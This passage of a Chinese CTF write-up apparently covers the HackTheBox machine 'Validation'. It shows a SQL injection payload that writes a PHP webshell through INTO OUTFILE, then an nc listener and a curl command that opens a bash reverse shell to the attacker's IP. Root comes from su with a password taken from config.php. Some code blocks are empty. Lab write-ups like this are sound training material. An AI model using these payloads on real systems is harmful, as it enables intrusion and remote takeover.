![](../Images/581443777302c3cdcf5edf47732dc424.png)

![](../Images/bd341d1148b49ac32e7475ead343651d.png)

  

直觉告我这是一注入，咱注它

  

```

```

  

经过反复确认，使用上述格式即可被成功执行，而且咱们有绝对路径！

有绝对路径可以做什么呢？开动聪明的小脑袋瓜想了一下，可以getshell啊！

## 漏洞利用

```

username=admin&country=Brazil'UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

由于在OSCP里是禁止使用菜刀等webshell管理工具的，所以咱们还是手工吧

首先要通过webshell获得一个bashshell

先在本地使用nc监听一个端口

  

```

nc -nvlp 4444
```

```

curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.48/4444 0>&1"'
```

  

然后使用上述命令获得一个shell

  

```










┌──(root💀kali)-[~/Desktop]
```

  

成功getshell

  

```



www-data@validation:/home/htb$ cat /home/htb/user.txt
```

  

成功拿到user权限的flag文件

## 权限提升

这台的提权异常简单，直接su切换用户就行了，密码就是`config.php`里找到的那个密码

  

```






www-data@validation:/home/htb$ su
```

  

至于为什么这个可以提权。。。我也不道，反正莫名其妙尝试了一下就莫名其妙的成root了，奇奇怪怪，不严谨

  

```


cat /root/root.txt
```

  

成功拿到root权限的flag文件
